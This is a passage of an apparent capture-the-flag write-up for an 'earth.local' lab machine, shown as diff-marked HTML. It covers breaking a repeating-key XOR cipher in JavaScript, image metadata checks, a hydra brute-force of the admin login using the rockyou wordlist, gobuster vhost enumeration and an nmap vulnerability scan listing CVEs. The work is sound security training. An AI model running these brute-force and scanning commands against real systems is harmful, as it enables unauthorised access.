+    <img src="29.putting-together-a-puzzle-before-solving-it.png" alt="" /><figcaption>29.putting-together-a-puzzle-before-solving-it</figcaption>
+</figure>
+<p><code>100</code> is <code>d</code>.</p>
+<p>The process seems like:</p>
+<ul>
+    <li>We have the plain text.</li>
+    <li>We have the cipher text.</li>
+    <li>We know the encoding (HEX) and process (XOR)</li>
+    <li>Just need to write the code to do it.</li>
+    <li>Oh why?</li>
+</ul>
+<div class="sourceCode" id="cb19"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a><span class="kw">var</span> plainText <span class="op">=</span> <span class="st">&quot;Saturn is the only planet in our solar system that is less dense than water. It could float in a bathtub if anybody could build a bathtub big enough.&quot;</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a><span class="kw">var</span> cipherText <span class="op">=</span> <span class="st">&quot;3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45&quot;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true"></a></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true"></a><span class="kw">var</span> plainChars <span class="op">=</span> plainText<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)</span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true"></a><span class="kw">var</span> plainValues <span class="op">=</span> plainChars<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> c<span class="op">.</span><span class="fu">charCodeAt</span>(<span class="dv">0</span>)) <span class="co">// decimals</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true"></a><span class="kw">var</span> cipherValues <span class="op">=</span> cipherText<span class="op">.</span><span class="fu">match</span>(<span class="ss">/</span><span class="sc">(</span><span class="ss">..</span><span class="sc">?)</span><span class="ss">/g</span>)<span class="op">.</span><span class="fu">map</span>(hex <span class="kw">=&gt;</span> <span class="pp">parseInt</span>(hex<span class="op">,</span> <span class="dv">16</span>)) <span class="co">// now we have decimals</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true"></a></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true"></a><span class="kw">var</span> xoredCharCodes <span class="op">=</span> plainValues<span class="op">.</span><span class="fu">map</span>((p<span class="op">,</span> i) <span class="kw">=&gt;</span> p <span class="op">^</span> cipherValues[i])</span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true"></a><span class="kw">var</span> xoredChars <span class="op">=</span> xoredCharCodes<span class="op">.</span><span class="fu">map</span>(cc <span class="kw">=&gt;</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(cc))</span>
+<span id="cb19-10"><a href="#cb19-10" aria-hidden="true"></a></span>
+<span id="cb19-11"><a href="#cb19-11" aria-hidden="true"></a>xoredChars<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)</span>
+<span id="cb19-12"><a href="#cb19-12" aria-hidden="true"></a><span class="st">&quot;duckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduck&quot;</span></span></code></pre></div>
+<figure>
+    <img src="30.duckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduck.png" alt="" /><figcaption>30.duckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduckyduck</figcaption>
+</figure>
+<figure>
+    <img src="31.correct.png" alt="" /><figcaption>31.correct</figcaption>
+</figure>
+<p>It doesn’t work for others, so the key must be different.</p>
+<blockquote>
+    <p>ignore this</p>
+</blockquote>
+<p>However, notice that in the first message there are a bunch of zeroes, and we seem to have plain text, or part of it.</p>
+<pre><code>37090b59030f11060b0a1b4e0000000000004312170a
+
+37 09 0b 59 03 0f 11 06 0b 0a 1b 4e 00 00 00 00 00 00 43 12 17 0a
+
+
+37 09 0b 59 03 0f 11 06 0b 0a 1b 4e 00 00 00 00 00 00 43 12 17 0a
+ S  a  t  u  r  n     i  s     t  h  e     o  n  l  y     p  l  a
+ d  h                                e     o  n  l  y     p  l  a
+ 
+// key: dh          e only pla
+37 09 54 55 52 4e 00 49 53 00 54 48 00 00 00 00 00 00 00 00 00 00
+ d  h                                e     o  n  l  y     p  l  a
+ 
+// it matches!!
+
+// key: dh        the only pla
+37 09 54 55 52 4e 00 49 53 00 00 00 00 00 00 00 00 00 00 00 00 00
+ d  h                          t  h   e     o  n  l  y     p  l  a
+ 
+// key: dh     is the only planet in our solar system that
+37095455524e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+// but this seems to be the maximum length of the key...</code></pre>
+<figure>
+    <img src="32.encoded-message-contains-plain-text.png" alt="" /><figcaption>32.encoded-message-contains-plain-text</figcaption>
+</figure>
+<p>Oh, wow, just got bamboozled by self. Zeroes come when we have same plain and cipher text. Discard the last part.</p>
+<blockquote>
+    <p>back on track</p>
+</blockquote>
+<p>Now the logic is, the key might be repeating itself. So, if I use “ducky” it produces same result as if I had used the longer version shown above.</p>
+<p>And that key might be reused. This is a huge assumption.</p>
+<div class="line-block">Message | Key | Generated output | | - | - | - | | <code>S</code> | ducky | 37 | | <code>S|</code> | ducky | 3709 | | <code>S|h</code> | ducky | 37090b<br />
+    | <code>S|h2</code> | ducky | 37090b59 | | <code>S|h2z</code> | ducky | 37090b5903 |</div>
+<figure>
+    <img src="33.is-this-breakthrough-or-breakdown.png" alt="" /><figcaption>33.is-this-breakthrough-or-breakdown</figcaption>
+</figure>
+<div class="sourceCode" id="cb21"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="kw">var</span> cipherText <span class="op">=</span> <span class="st">&quot;37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40&quot;</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="kw">var</span> cipherHexes <span class="op">=</span> cipherText<span class="op">.</span><span class="fu">match</span>(<span class="ss">/</span><span class="sc">(</span><span class="ss">..</span><span class="sc">?)</span><span class="ss">/g</span>)</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true"></a><span class="kw">var</span> key <span class="op">=</span> <span class="st">&quot;ducky&quot;</span><span class="op">.</span><span class="fu">repeat</span>(<span class="bu">Math</span><span class="op">.</span><span class="fu">ceil</span>(cipherText<span class="op">.</span><span class="at">length</span> <span class="op">/</span> <span class="dv">2</span> <span class="op">/</span> <span class="dv">5</span>))</span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true"></a><span class="kw">var</span> keyDecimals <span class="op">=</span> key<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="fu">charCodeAt</span>(<span class="dv">0</span>))</span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true"></a></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true"></a><span class="kw">var</span> cipherDecimals <span class="op">=</span> cipherHexes<span class="op">.</span><span class="fu">map</span>(h <span class="kw">=&gt;</span> <span class="pp">parseInt</span>(h<span class="op">,</span> <span class="dv">16</span>))</span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true"></a>keyDecimals<span class="op">.</span><span class="fu">map</span>((k<span class="op">,</span> i) <span class="kw">=&gt;</span> cipherDecimals[i] <span class="op">^</span> k)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(i))<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)</span>
+<span id="cb21-9"><a href="#cb21-9" aria-hidden="true"></a><span class="st">&quot;S|h2zkde`s</span><span class="sc">\u007f</span><span class="st">;ckyduc(ks</span><span class="sc">\u007f</span><span class="st">x`w%rt$coq-ayfwp%srhtoz=s~(Nk```i%;Weenzh`</span><span class="sc">\u007f</span><span class="st">y6mk Fzry9=Sy</span><span class="sc">\u0089</span><span class="st">øÞg-</span><span class="sc">\u007f</span><span class="st">yxs</span><span class="sc">\&quot;</span><span class="st">qhju &gt;;-*=(sc`ch</span><span class="sc">\u007f</span><span class="st">q~hw7/&#39;!</span><span class="sc">\&quot;</span><span class="st">&amp;:6ollnh)*{rtj(</span><span class="sc">\u009b</span><span class="st">åÀ-wxecem </span><span class="sc">\u007f</span><span class="st">t yco</span><span class="sc">\u007f</span><span class="st">ykp*j~jw%X{h~a{</span><span class="sc">\u007f</span><span class="st">|</span><span class="sc">\u007f</span><span class="st">k6vj E~w*Nrhf&amp;8Cx,li%usjr&#39;`d</span><span class="sc">\u007f</span><span class="st">sy6cv gtnm7|ti(~ey~%nlv</span><span class="sc">\u007f</span><span class="st">w7fg-vsof</span><span class="sc">\&quot;</span><span class="st">ds+^axcu</span><span class="sc">\u0097</span><span class="st">âÝd&#39;S</span><span class="sc">\u007f</span><span class="st">sxn6Adnrtn+y&quot;</span></span></code></pre></div>
+<p>The key is certainly not “ducky” for First cipher text.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a><span class="kw">var</span> cipherText <span class="op">=</span> <span class="st">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a><span class="kw">var</span> cipherHexes <span class="op">=</span> cipherText<span class="op">.</span><span class="fu">match</span>(<span class="ss">/</span><span class="sc">(</span><span class="ss">..</span><span class="sc">?)</span><span class="ss">/g</span>)</span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true"></a></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true"></a><span class="kw">var</span> key <span class="op">=</span> <span class="st">&quot;ducky&quot;</span><span class="op">.</span><span class="fu">repeat</span>(<span class="bu">Math</span><span class="op">.</span><span class="fu">ceil</span>(cipherText<span class="op">.</span><span class="at">length</span> <span class="op">/</span> <span class="dv">2</span> <span class="op">/</span> <span class="dv">5</span>))</span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true"></a><span class="kw">var</span> keyDecimals <span class="op">=</span> key<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="fu">charCodeAt</span>(<span class="dv">0</span>))</span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true"></a></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true"></a><span class="kw">var</span> cipherDecimals <span class="op">=</span> cipherHexes<span class="op">.</span><span class="fu">map</span>(h <span class="kw">=&gt;</span> <span class="pp">parseInt</span>(h<span class="op">,</span> <span class="dv">16</span>))</span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true"></a>keyDecimals<span class="op">.</span><span class="fu">map</span>((k<span class="op">,</span> i) <span class="kw">=&gt;</span> cipherDecimals[i] <span class="op">^</span> k)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(i))<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)</span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true"></a><span class="st">&quot;@wrpccpda8d</span><span class="sc">\u007f</span><span class="st"> qyn{id}t3b}4azdgvq!n{aduckuhs</span><span class="sc">\&quot;</span><span class="st">dpe7m{%ir.oa~tgwni:/Guwun(wjiik</span><span class="sc">\u007f</span><span class="st">%~!f~) #-&lt;gn{osgr.sh`dx*vd</span><span class="sc">\u007f</span><span class="st">/*J9i~ov*rno+vtrtd)v~bve{c,ecuu,1~~</span><span class="sc">\&quot;</span><span class="st">@ks`y8b&#39;qcul</span><span class="sc">\u007f</span><span class="st">by/8f{`l8a1{{uw~t.qx!</span><span class="sc">\u007f</span><span class="st">`p-waz}in</span><span class="sc">\&quot;</span><span class="st">dpe7`j*mn.~x7qd</span><span class="sc">\u007f</span><span class="st">hob/Guwun/b%zpctva?f~l4lvx%tbq|i</span><span class="sc">\u007f</span><span class="st">k&amp;-msjn~mw!~rpi~c8ztifbvxrfd`{y.uj4lb}cfh=xr8ckn-4}~ebk&amp;&amp;yuboaqi2i{</span><span class="sc">\u007f</span><span class="st">a/bmyv50]w{d+opbtmxud|n%{w~fj#oe.cysyaxyie/v|du&amp;dxc~$cz|1?bzl4ljuvby#{{&lt;kk</span><span class="sc">\u007f</span><span class="st">mo+kd#$/;=2tzjqeh&amp;snqos&#39;qn{9ky&quot;</span></span></code></pre></div>
+<p>And “ducky” doesn’t seem to be a key for third one either.</p>
+<figure>
+    <img src="34.dhak-ke-teen-paat.png" alt="" /><figcaption>34.dhak-ke-teen-paat: no result</figcaption>
+</figure>
+<blockquote>
+    <p>Trackback to image</p>
+</blockquote>
+<pre class="shell"><code>wget -q http://earth.local/static/earth1.jpg                                
+                                                                                                                   
+
+exiftool earth1.jpg         
+ExifTool Version Number         : 12.36
+File Name                       : earth1.jpg
+Directory                       : .
+File Size                       : 6.2 MiB
+File Modification Date/Time     : 2021:10:12 14:56:28+05:30
+File Access Date/Time           : 2021:12:06 08:52:02+05:30
+File Inode Change Date/Time     : 2021:12:06 08:52:02+05:30
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.02
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Orientation                     : Horizontal (normal)
+X Resolution                    : 300
+Y Resolution                    : 300
+Resolution Unit                 : inches
+Software                        : Adobe Photoshop CS Windows
+Modify Date                     : 2005:05:13 13:09:04
+Color Space                     : sRGB
+Exif Image Width                : 3000
+Exif Image Height               : 3002
+Compression                     : JPEG (old-style)
+Thumbnail Offset                : 332
+Thumbnail Length                : 8575
+IPTC Digest                     : 00000000000000000000000000000000
+Displayed Units X               : inches
+Displayed Units Y               : inches
+Print Style                     : Centered
+Print Position                  : 0 0
+Print Scale                     : 1
+Global Angle                    : 120
+Global Altitude                 : 30
+Copyright Flag                  : False
+URL List                        : 
+Slices Group Name               : GPN-2000-001138
+Num Slices                      : 1
+Pixel Aspect Ratio              : 1
+Photoshop Thumbnail             : (Binary data 8575 bytes, use -b option to extract)
+Has Real Merged Data            : Yes
+Writer Name                     : Adobe Photoshop
+Reader Name                     : Adobe Photoshop CS
+Photoshop Quality               : 12
+Photoshop Format                : Standard
+Progressive Scans               : 3 Scans
+XMP Toolkit                     : XMP toolkit 3.0-28, framework 1.6
+About                           : uuid:aa2f4252-c3d1-11d9-a738-8810908139ee
+History                         : 
+Create Date                     : 2005:05:13 13:09:04-05:00
+Metadata Date                   : 2005:05:13 13:09:04-05:00
+Creator Tool                    : Adobe Photoshop CS Windows
+Document ID                     : adobe:docid:photoshop:aa2f4251-c3d1-11d9-a738-8810908139ee
+Format                          : image/jpeg
+Profile CMM Type                : Linotronic
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+Color Space Data                : RGB
+Profile Connection Space        : XYZ
+Profile Date Time               : 1998:02:09 06:49:00
+Profile File Signature          : acsp
+Primary Platform                : Microsoft Corporation
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             : Hewlett-Packard
+Device Model                    : sRGB
+Device Attributes               : Reflective, Glossy, Positive, Color
+Rendering Intent                : Perceptual
+Connection Space Illuminant     : 0.9642 1 0.82491
+Profile Creator                 : Hewlett-Packard
+Profile ID                      : 0
+Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
+Profile Description             : sRGB IEC61966-2.1
+Media White Point               : 0.95045 1 1.08905
+Media Black Point               : 0 0 0
+Red Matrix Column               : 0.43607 0.22249 0.01392
+Green Matrix Column             : 0.38515 0.71687 0.09708
+Blue Matrix Column              : 0.14307 0.06061 0.7141
+Device Mfg Desc                 : IEC http://www.iec.ch
+Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
+Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
+Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
+Viewing Cond Surround           : 3.92889 4.07439 3.36179
+Viewing Cond Illuminant Type    : D50
+Luminance                       : 76.03647 80 87.12462
+Measurement Observer            : CIE 1931
+Measurement Backing             : 0 0 0
+Measurement Geometry            : Unknown
+Measurement Flare               : 0.999%
+Measurement Illuminant          : D65
+Technology                      : Cathode Ray Tube Display
+Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
+Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
+Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
+DCT Encode Version              : 100
+APP14 Flags 0                   : [14]
+APP14 Flags 1                   : (none)
+Color Transform                 : YCbCr
+Image Width                     : 3000
+Image Height                    : 3002
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 3000x3002
+Megapixels                      : 9.0
+Thumbnail Image                 : (Binary data 8575 bytes, use -b option to extract)</code></pre>
+<figure>
+    <img src="35.image-info.png" alt="" /><figcaption>35.image-info</figcaption>
+</figure>
+<p>Doesn’t look like that it contains anything useful.</p>
+<pre class="shell"><code>exiftool -b earth1.jpg &gt; binary
+file binary
+hexeditor -b binary
+strings binary</code></pre>
+<blockquote>
+    <p>Backtracking to beginning.</p>
+</blockquote>
+<ul>
+    <li>Three ports, SSH, HTTP and HTTPS</li>
+    <li>earth.local is the domain</li>
+    <li>An /admin page, we might be able to brute force it via hydra and Saturn like as potential passwords.
+        <ul>
+            <li>But no idea about the user, is it
+                <ul>
+                    <li>admin</li>
+                    <li>Admin</li>
+                    <li>administraotr</li>
+                    <li>Administrator</li>
+                    <li>root</li>
+                    <li>Root</li>
+                    <li>earth</li>
+                    <li>Earth</li>
+                    <li>saturn</li>
+                    <li>Saturn</li>
+                </ul></li>
+        </ul></li>
+</ul>
+<blockquote>
+    <p>Poking SSH</p>
+</blockquote>
+<pre class="shell"><code>ssh root@$RHOST        
+The authenticity of host &#39;192.168.56.67 (192.168.56.67)&#39; can&#39;t be established.
+ED25519 key fingerprint is SHA256:/4a4sQXJ47f2THOJoiNy3s8VjcpL10/dl7Th9QMmQtI.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;192.168.56.67&#39; (ED25519) to the list of known hosts.
+root@192.168.56.67&#39;s password: 
+Permission denied, please try again.
+root@192.168.56.67&#39;s password:</code></pre>
+<figure>
+    <img src="36.poking-ssh.png" alt="" /><figcaption>36.poking-ssh</figcaption>
+</figure>
+<blockquote>
+    <p>Looking for exact string match</p>
+</blockquote>
+<figure>
+    <img src="37.twitter-has-it.png" alt="" /><figcaption>37.twitter-has-it</figcaption>
+</figure>
+<p>https://twitter.com/engineers_feed/status/1405661534789935108</p>
+<p>A few words of interest:</p>
+<ul>
+    <li>space</li>
+    <li>fact</li>
+    <li>world of engineering</li>
+    <li>engineers_feed</li>
+</ul>
+<blockquote>
+    <p>Looking at login page</p>
+</blockquote>
+<figure>
+    <img src="38.username-length-150.png" alt="" /><figcaption>38.username-length-150</figcaption>
+</figure>
+<p>Am I crazy that the length is specifically 150? Do we know a string that is very long, and was revealed to us easily?</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;Saturn is the only planet in our solar system that is less dense than water. It could float in a bathtub if anybody could build a bathtub big enough.&quot;</span></span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a>    <span class="op">.</span><span class="at">length</span> <span class="op">&lt;</span> <span class="dv">150</span>)</span></code></pre></div>
+<blockquote>
+    <p>hydra doesn’t seem like it</p>
+</blockquote>
+<pre class="shell"><code>hydra -l &quot;Saturn is the only planet in our solar system that is less dense than water. It could float in a bathtub if anybody could build a bathtub big enough.&quot; -P /usr/share/wordlists/rockyou.txt earth.local http-post-form &#39;/admin/login:username=^USER^&amp;password=^PASS^&amp;submit=Log+In:F=Please enter a correct username and password.&#39; -t 64
+Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-06 09:24:18
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking http-post-form://earth.local:80/admin/login:username=^USER^&amp;password=^PASS^&amp;submit=Log+In:F=Please enter a correct username and password.
+[STATUS] 13726.00 tries/min, 13726 tries in 00:01h, 14330673 to do in 17:25h, 64 active
+[STATUS] 13707.33 tries/min, 41122 tries in 00:03h, 14303277 to do in 17:24h, 64 active
+[STATUS] 13795.86 tries/min, 96571 tries in 00:07h, 14247828 to do in 17:13h, 64 active
+^CThe session file ./hydra.restore was written. Type &quot;hydra -R&quot; to resume session.</code></pre>
+<figure>
+    <img src="39.hydra-is-not-it.png" alt="" /><figcaption>39.hydra-is-not-it</figcaption>
+</figure>
+<blockquote>
+    <p>Are there any other vhost? The site was adamant about using earth.local, are there anymore?</p>
+</blockquote>
+<pre class="shell"><code>gobuster vhost --url http://earth.local --wordlist /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt</code></pre>
+<figure>
+    <img src="40.gobuster-vhost-failed.png" alt="" /><figcaption>40.gobuster-vhost-failed</figcaption>
+</figure>
+<blockquote>
+    <p>Way back to beginning. nmap again.</p>
+</blockquote>
+<p>All I know at this point is the IP of this host.</p>
+<pre class="shell"><code>sudo nmap -n earth.local -T4 --min-rate=5000 -A -sVC -p22,80,443 -Pn --script=vuln,*enum* | tee nmap.vuln-enum.txt
+[sudo] password for f0c1s: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 09:48 IST
+Nmap scan report for earth.local (192.168.56.67)
+Host is up (0.00068s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:8.6: 
+|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
+|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ *EXPLOIT*
+|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/  *EXPLOIT*
+|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/  *EXPLOIT*
+|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/  *EXPLOIT*
+|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/       *EXPLOIT*
+|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
+|_      CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
+| ssh2-enum-algos: 
+|   kex_algorithms: (9)
+|       curve25519-sha256
+|       curve25519-sha256@libssh.org
+|       ecdh-sha2-nistp256
+|       ecdh-sha2-nistp384
+|       ecdh-sha2-nistp521
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group14-sha256
+|       diffie-hellman-group16-sha512
+|       diffie-hellman-group18-sha512
+|   server_host_key_algorithms: (4)
+|       rsa-sha2-512
+|       rsa-sha2-256
+|       ecdsa-sha2-nistp256
+|       ssh-ed25519
+|   encryption_algorithms: (5)
+|       aes256-gcm@openssh.com
+|       chacha20-poly1305@openssh.com
+|       aes256-ctr
+|       aes128-gcm@openssh.com
+|       aes128-ctr
+|   mac_algorithms: (8)
+|       hmac-sha2-256-etm@openssh.com
+|       hmac-sha1-etm@openssh.com
+|       umac-128-etm@openssh.com
+|       hmac-sha2-512-etm@openssh.com
+|       hmac-sha2-256
+|       hmac-sha1
+|       umac-128@openssh.com
+|       hmac-sha2-512
+|   compression_algorithms: (2)
+|       none
+|_      zlib@openssh.com
+80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+|_http-trace: TRACE is enabled
+|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+| http-enum: 
+|   /admin/: Possible admin folder
+|_  /icons/: Potentially interesting folder w/ directory listing
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+|_http-trace: TRACE is enabled
+| http-enum: 
+|   /admin/: Possible admin folder
+|_  /icons/: Potentially interesting folder w/ directory listing
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+| ssl-enum-ciphers: 
+|   TLSv1.2: 
+|     ciphers: 
+|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 3072) - A
+|       TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 (dh 3072) - A
+|       TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (dh 3072) - A
+|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 3072) - A
+|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 (dh 3072) - A
+|       TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 (dh 3072) - A
+|       TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (dh 3072) - A
+|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A
+|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 (secp256r1) - A
+|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A
+|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A
+|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 (secp256r1) - A
+|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A
+|       TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (secp256r1) - A
+|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 4096) - A
+|       TLS_RSA_WITH_AES_128_CBC_SHA256 (rsa 4096) - A
+|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 4096) - A
+|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 4096) - A
+|       TLS_RSA_WITH_AES_256_CBC_SHA256 (rsa 4096) - A
+|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 4096) - A
+|     compressors: 
+|       NULL
+|     cipher preference: client
+|     warnings: 
+|       Key exchange (dh 3072) of lower strength than certificate key
+|       Key exchange (secp256r1) of lower strength than certificate key
+|   TLSv1.3: 
+|     ciphers: 
